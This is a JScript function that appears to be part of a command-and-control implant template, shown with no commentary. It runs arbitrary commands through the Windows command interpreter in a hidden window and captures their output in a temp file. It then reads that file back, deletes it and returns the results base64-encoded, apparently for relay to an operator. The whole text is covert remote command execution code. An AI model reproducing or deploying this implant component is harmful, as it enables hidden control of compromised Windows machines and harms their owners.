function cmd(command) {
  tmp = wscriptshell.ExpandEnvironmentStrings("%TEMP%");
  stdout_path = tmp + '\\{{ command_stdout }}.tmp';

  fs = new ActiveXObject("Scripting.FileSystemObject");
  compsec = wscriptshell.ExpandEnvironmentStrings("%COMSPEC%");
  if (fs.FileExists(stdout_path)) {
    return b64e(stdout_path + ' already exists, please remove before running commands.');
  }
  command = compsec + ' /c' + command + ' 1> ' + stdout_path + ' 2>&1';
  try {
    wscriptshell.Run(command, 0, true);
    results = download(stdout_path);
    delfile(stdout_path);
    return results;
  } catch (e) {
    return b64e('Failed to run ' + command + ': ' + e.message);
  }
}